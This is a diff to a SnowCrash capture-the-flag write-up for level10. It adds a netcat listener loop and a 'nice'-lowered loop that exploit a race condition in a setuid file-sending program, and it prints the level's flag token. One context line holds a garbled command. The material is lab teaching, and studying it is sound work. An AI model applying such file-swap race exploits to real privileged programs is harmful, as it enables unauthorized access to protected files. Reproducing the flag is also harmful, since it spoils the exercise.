@@ -50,6 +50,20 @@ level10@SnowCrash:~$ ./level10
 #	The problem is nc expects the sever to be running privor to the client connecting 
 #		Hence there is a race condition between the two.
 
+# We can prove this with the following commands
+#	You need 2 terminals ssh into the vm
+
+# VM 1 run
+level10@SnowCrash:~$ while :; do nc -l 6969; done
+.*( )*.
+
+# VM 2 run
+while :; do nice -n 20 ./level10 /tmp/token10 127.0.0.1; done	# Note nice it to to lower the priority as low as possible
+Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!
+
+# We see that we are on the right path!
+
 # So we open a shell on which we listen in loop with the following command:
 #	while [42]; do nc-1 6969; therefore
 
@@ -89,7 +103,13 @@ flag10@SnowCrash:~$ getflag
 Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 
 
+# What we learnt
+# The point of this exercise is to trick the program
+#	by switching out the file while the program is running. Hence a race condition.
+# We learnt about race conditions
+
 Resources
 https://linux.die.net/man/1/nc
 https://books.google.co.za/books?id=xpSSXvoQBq4C&pg=PA178&lpg=PA178&dq=what+localhost+5151&source=bl&ots=SqC25oe3eL&sig=ytJE2dfwMrG6ZMdjQfLyKKwNoaI&hl=en&sa=X&redir_esc=y#v=onepage&q=what%20localhost%205151&f=false
-
+https://www.lifewire.com/uses-of-commands-nice-renice-2201087
+https://www.mattandreko.com/2011/12/11/exploit-exercises-nebula-10/
